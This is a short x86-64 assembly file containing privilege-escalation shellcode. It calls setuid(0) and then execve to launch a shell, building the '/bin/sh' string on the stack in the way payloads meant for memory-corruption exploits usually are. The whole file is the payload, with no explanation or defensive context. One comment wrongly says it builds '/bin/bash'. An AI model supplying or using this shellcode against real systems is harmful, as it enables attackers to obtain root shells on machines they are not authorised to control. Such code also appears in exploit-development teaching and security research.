.global _start 
_start:
.intel_syntax noprefix
######   setuid(0)
        xor eax, eax # 0 out rax
        add eax, 105 # add opcode of setuid to rax
        xor edi, edi # 0 out rdi to make 0 the imput of setuid
        syscall
######   execve
        xor eax, eax
        add eax, 59
	xor edi, edi
        xor ebx, ebx
        
	mov ebx, 0x0068732f
	mov dword ptr [rsp+4], ebx
	mov ebx, 0x6e69622f
        mov dword ptr [rsp], ebx # stack out the /bin/bash string	
	push rsp
	pop rdi

        xor esi, esi
        xor edx, edx
        syscall
